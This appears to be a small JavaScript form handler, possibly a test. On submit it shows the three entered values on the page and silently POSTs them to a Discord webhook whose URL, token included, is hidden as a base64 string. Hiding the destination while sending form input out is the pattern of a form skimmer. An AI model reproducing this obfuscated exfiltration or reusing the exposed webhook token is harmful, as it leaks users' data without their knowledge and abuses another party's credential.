
document.getElementById('form').addEventListener('submit', function(event) {
  const LINK = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxODU0OTgzMDA1NDMxNDAxNS85ZGRqaXNtS0Q4VEJpNVpMUHNhMjhCR05XZVhhbFFGVV9oNFRleW1NcXpiT25FdGJxNXN5c3B1dy1IaE91RXFKUzlaMg==';

  event.preventDefault();
  const in1 = document.getElementById('in1').value;
  const in2 = document.getElementById('in2').value;
  const in3 = document.getElementById('in3').value;

  const divData = document.getElementById('result');
  divData.textContent = `${in3} ${in2} ${in1}`;

  let data = {
    "embeds": [{
    "title": "TEST",
    "description": `${in3} ${in2} ${in1}`,
    "color": 9055202
    }]
  };
  fetch(atob(LINK), {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response => console.log('Success:', response))
  .catch(error => console.error('Error:', error));
});

console.log("[INFO] executed form-submission.js");
